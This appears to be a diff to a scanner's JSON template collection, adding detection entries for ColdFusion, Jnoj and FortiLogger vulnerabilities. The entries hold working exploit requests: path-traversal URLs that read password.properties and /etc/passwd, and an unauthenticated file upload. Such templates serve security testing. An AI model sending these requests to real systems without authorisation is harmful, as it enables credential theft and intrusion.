@@ -75,6 +75,42 @@
       ]
     },
     {
+      "id": "CVE-2010-2861",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI",
+        "reference": "https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861",
+        "severity": "high",
+        "tags": "cve,cve2010,coldfusion,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "rdspassword=",
+                "encrypted="
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2013-2251",
       "info": {
         "author": "exploitation & @dwisiswant0",
@@ -2943,6 +2979,39 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/getcfg.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-17538",
+      "info": {
+        "author": "pussycat0x",
+        "name": "Jnoj Directory Traversal for file reading(LFI)",
+        "reference": "https://github.com/shi-yang/jnoj/issues/53",
+        "severity": "high",
+        "tegs": "cve.cve2019,jnoj,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n"
           ]
         }
       ]
@@ -7390,7 +7459,7 @@
       "info": {
         "author": "dwisiswant0",
         "description": "The vulnerability allows unauthenticated remote attackers to upload file leading to remote code execution (RCE). This templates only detects the plugin.",
-        "name": "VMware vCenter Unauthorized RCE",
+        "name": "VMware vCenter Unauthenticated RCE",
         "reference": "https://swarm.ptsecurity.com/unauth-rce-vmware/",
         "severity": "critical",
         "tags": "cve,cve2021,vmware,rce"
@@ -7732,6 +7801,50 @@
           ],
           "raw": [
             "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"/etc/passwd\"}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-3378",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "This template detects an unauthenticated arbitrary file upload\nvia insecure POST request. It has been tested on version 4.4.2.2 in\nWindows 10 Enterprise.\n",
+        "name": "FortiLogger Unauthenticated Arbitrary File Upload",
+        "reference": "https://erberkan.github.io/2021/cve-2021-3378/",
+        "severity": "critical",
+        "tags": "cve,cve2021,fortilogger,fortigate,fortinet"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "POC_TEST"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/plain",
+                "ASP.NET"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: application/json\nReferer: {{BaseURL}}\nConnection: close\nX-Requested-With: XMLHttpRequest\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.txt\"\nContent-Type: imnage/png\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n",
+            "GET /Assets/temp/hotspot/img/logohotspot.txt HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
